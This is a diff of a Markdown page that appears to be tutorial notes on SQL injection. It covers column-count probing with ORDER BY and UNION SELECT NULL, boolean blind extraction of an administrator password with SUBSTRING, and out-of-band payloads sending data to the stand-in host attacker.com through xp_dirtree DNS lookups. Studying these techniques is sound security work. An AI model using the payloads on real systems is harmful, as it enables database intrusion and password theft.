@@ -37,23 +37,22 @@ If your condition reaches an UPDATE or DELETE statement, for example, it can res
 
 **First way**: Injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. Example (the injection point is a quoted string within the `WHERE` clause)
 
-```
+```sql
 ' ORDER BY 1--
 ' ORDER BY 2--
 ' ORDER BY 3--
-etc.
+-- etc.
 ```
 
 ***
 
 **Second way**: submitting a series of `UNION SELECT` payloads specifying a different number of null values. NULL is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.
 
-```
-' UNION SELECT NULL--
+<pre class="language-sql"><code class="lang-sql">' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
-etc.
-```
+<strong>-- etc.
+</strong></code></pre>
 
 {% hint style="info" %}
 **Note**: the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results
@@ -63,7 +62,7 @@ etc.
 
 Do you want a string?
 
-```
+```sql
 ' UNION SELECT 'a',NULL,NULL,NULL--
 ' UNION SELECT NULL,'a',NULL,NULL--
 ' UNION SELECT NULL,NULL,'a',NULL--
@@ -120,24 +119,20 @@ Blind SQLi occurs when an application is vulnerable to SQLi, but its HTTP respon
 SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
 ```
 
-* `xyz' AND '1'='1`
-* `xyz' AND '1'='2`
+```sql
+xyz' AND '1'='1
+xyz' AND '1'='2
+```
 
-See differences in response. Pay attention to small changes that you might not even see in the render! Use Burp's comparer
+See differences in response. Watch for subtle changes you might miss in the render! Use Burp's comparer
 
 **Extract data one piece at a time**
 
-First way
+```sql
+xyz' AND SUBSTRING((SELECT Psw FROM Users WHERE Username = 'Admin'), 1, 1) = 's
+```
 
-* `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm`
-  * This returns the message that indicate that the injected condition is true, and so the first character of the password is greater than `m`
-* `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't`
-  * This returns the message that indicate that the injected condition is false, and so the first character of the password is not greater than `t`.
-
-Second way
-
-* `xyz' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's`
-  * See the response to confirm that the first character of the password is `s`
+See the response to confirm that the first character of the password is `s`
 
 We can continue this process to systematically extract data.
 
@@ -222,12 +217,12 @@ Cookie: TrackingId=xyz'	AND 1=(SELECT CASE WHEN (SUBSTR((SELECT password FROM us
 
 An application might carry out a SQL query asynchronously (another thread execute the SQL query)
 
-```markdown
-# Triggering a DNS query
+```sql
+-- Triggering a DNS query
 '; exec master..xp_dirtree '//attacker.com/a'--
 ' UNION SELECT UTL_INADDR.get_host_address('attacker.com')
 
-# Exfiltrate data
+-- Exfiltrate data
 '; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.attacker.com/a"')--
 ```
 
